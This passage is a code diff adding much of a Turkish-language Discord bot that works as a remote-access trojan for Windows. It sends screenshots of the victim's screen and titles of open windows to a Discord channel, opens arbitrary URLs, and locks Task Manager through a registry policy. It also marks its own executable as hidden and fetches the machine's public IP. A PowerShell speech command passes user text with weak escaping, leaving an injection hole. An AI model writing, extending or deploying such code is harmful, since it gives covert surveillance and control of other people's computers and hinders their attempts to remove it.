+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="ekrankapat")
+async def turn_off_screen(ctx):
+  try:
+    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
+    await ctx.send("Monitör uyku moduna alındı 💤")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="pencereler")
+async def list_windows(ctx):
+  try:
+    windows = []
+
+    def enum_windows_proc(hwnd, lParam):
+      if ctypes.windll.user32.IsWindowVisible(hwnd):
+        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+        if length > 0:
+          buff = ctypes.create_unicode_buffer(length + 1)
+          ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
+          windows.append(buff.value)
+      return True
+
+    EnumWindowsProc = ctypes.WINFUNCTYPE(
+        ctypes.c_bool, ctypes.c_int, ctypes.c_int
+    )
+    ctypes.windll.user32.EnumWindows(EnumWindowsProc(enum_windows_proc), 0)
+    result = "\n".join(windows[:15])
+    if len(result) > 1900:
+      result = result[:1900] + "\n..."
+    await ctx.send(f"```text\n{result}\n```")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="konustur")
+async def speak_text(ctx, *, metin: str):
+  try:
+    safe_metin = metin.replace('"', '\\"')
+    ps_cmd = (
+        "Add-Type -AssemblyName System.Speech; (New-Object"
+        f" System.Speech.Synthesis.SpeechSynthesizer).Speak('{safe_metin}')"
+    )
+    subprocess.Popen(["powershell", "-Command", ps_cmd], shell=True)
+    await ctx.send(f"Bilgisayara sesli okutuluyor: `{metin}` 🗣️")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="simgeler")
+async def toggle_icons(ctx):
+  try:
+    hwnd_listView = ctypes.windll.user32.FindWindowExW(
+        ctypes.windll.user32.FindWindowExW(
+            ctypes.windll.user32.FindWindowW("Progman", None),
+            None,
+            "SHELLDLL_DefView",
+            None,
+        ),
+        None,
+        "SysListView32",
+        None,
+    )
+    is_visible = ctypes.windll.user32.IsWindowVisible(hwnd_listView)
+    cmd = 0 if is_visible else 5
+    ctypes.windll.user32.ShowWindow(hwnd_listView, cmd)
+    durum = "gizlendi 🙈" if is_visible else "getirildi 👁️"
+    await ctx.send(f"Masaüstü simgeleri {durum}")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="mesaj")
+async def send_message(ctx, *, mesaj: str):
+  try:
+    ctypes.windll.user32.MessageBoxW(0, mesaj, "Sistem Bildirimi", 0x40 | 0x1)
+    await ctx.send("Mesaj ekranda gösterildi.")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command()
+async def url(ctx, *, link):
+  try:
+    webbrowser.open(link)
+    await ctx.send(f"✅ `{link}` tarayıcıda açıldı.")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command(name="sescal")
+async def play_sound(ctx, dosya_adi: str = "ses.wav"):
+  import winsound
+
+  try:
+    winsound.PlaySound(dosya_adi, winsound.SND_ASYNC | winsound.SND_FILENAME)
+    await ctx.send(f"`{dosya_adi}` arka planda oynatılıyor 🔊")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(aliases=["screenshot"])
+async def ss(ctx):
+  try:
+    img = ImageGrab.grab()
+    output = BytesIO()
+    img.save(output, format="PNG")
+    output.seek(0)
+    file = discord.File(fp=output, filename="screenshot.png")
+    await ctx.send(file=file)
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="gorevyoneticisikapat")
+async def disable_task_manager(ctx, durum: str = "kapat"):
+  """Görev Yöneticisi'ni kilitler veya açar.
+
+  Kullanım: !gorevyoneticisikapat kapat VEYA !gorevyoneticisikapat ac
+  """
+  def set_taskmgr(state: int):
+    try:
+      reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+      try:
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE
+        )
+      except FileNotFoundError:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+
+      winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, state)
+      winreg.CloseKey(key)
+      return True
+    except Exception as e:
+      return False
+
+  loop = asyncio.get_running_loop()
+
+  if durum.lower() == "kapat":
+    success = await loop.run_in_executor(None, set_taskmgr, 1)
+    if success:
+      await ctx.send(
+          "🔒 Görev Yöneticisi başarıyla kilitlendi! (Ctrl+Shift+Esc devre dışı)"
+      )
+    else:
+      await ctx.send("❌ İşlem başarısız.")
+
+  elif durum.lower() == "ac":
+    success = await loop.run_in_executor(None, set_taskmgr, 0)
+    if success:
+      await ctx.send("🔓 Görev Yöneticisi kilidi açıldı!")
+    else:
+      await ctx.send("❌ İşlem başarısız.")
+  else:
+    await ctx.send(
+        "⚠️ Hatalı kullanım! `!gorevyoneticisikapat kapat` veya"
+        " `!gorevyoneticisikapat ac` yazmalısın."
+    )
+
+
+@client.command(name="sistemdili")
+async def change_keyboard_layout(ctx, lang: str = "en"):
+  try:
+    user32 = ctypes.windll.user32
+    layout_code = "00000409" if lang.lower() == "en" else "0000041F"
+    kl = user32.LoadKeyboardLayoutW(layout_code, 1)
+    user32.ActivateKeyboardLayout(kl, 0)
+    await ctx.send(
+        f"⌨️ Klavye düzeni başarıyla `{lang.upper()}` olarak değiştirildi!"
+    )
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+def emergency_exit_listener():
+  p_count = 0
+  last_time = 0
+  while True:
+    try:
+      if ctypes.windll.user32.GetAsyncKeyState(0x50) & 0x8000:
+        now = time.time()
+        if now - last_time > 1.5:
+          p_count = 0
+        p_count += 1
+        last_time = now
+
+        if p_count >= 3:
+          os._exit(0)
+        time.sleep(0.3)
+    except:
+      pass
+    time.sleep(0.05)
+
+
+threading.Thread(target=emergency_exit_listener, daemon=True).start()
+
+
+def get_local_ip():
+  try:
+    import socket
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+  except:
+    return "Bilinmiyor"
+
+
+def get_public_ip():
+  try:
+    import urllib.request
+
+    ip = urllib.request.urlopen("https://api.ipify.org").read().decode("utf-8")
+    return ip
+  except:
+    return "Bilinmiyor"
+
+
+def hide_self():
+  try:
+    path = sys.executable
+    ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)
+  except Exception:
+    pass
+
+
+hide_self()
+
+try:
+  client.run(TOKEN)
+except Exception as e:
+  print(f"Bot başlatılamadı: {e}")
